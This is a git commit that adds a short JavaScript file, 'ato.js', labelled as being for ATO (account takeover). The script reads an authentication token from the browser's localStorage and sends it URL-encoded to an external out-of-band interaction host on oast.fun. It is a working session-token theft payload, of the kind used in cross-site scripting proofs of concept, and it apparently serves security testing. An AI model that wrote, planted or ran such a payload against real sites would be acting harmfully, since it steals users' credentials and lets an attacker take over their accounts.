365409cba9b5c69d9f1d43cc42e0a23421f3d1c8
swathip888a <swathip888a@gmail.com>
2025-11-10 17:33:46 +0530

    Create ato.js

---
+++ ato.js
@@ -0,0 +1,8 @@
+// This script is for ATO
+(function() {
+  const token = localStorage.getItem('token');
+  if (token) {
+    const encodedToken = encodeURIComponent(token);
+    fetch(`abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun/?token=${encodedToken}`);
+  }
+})();
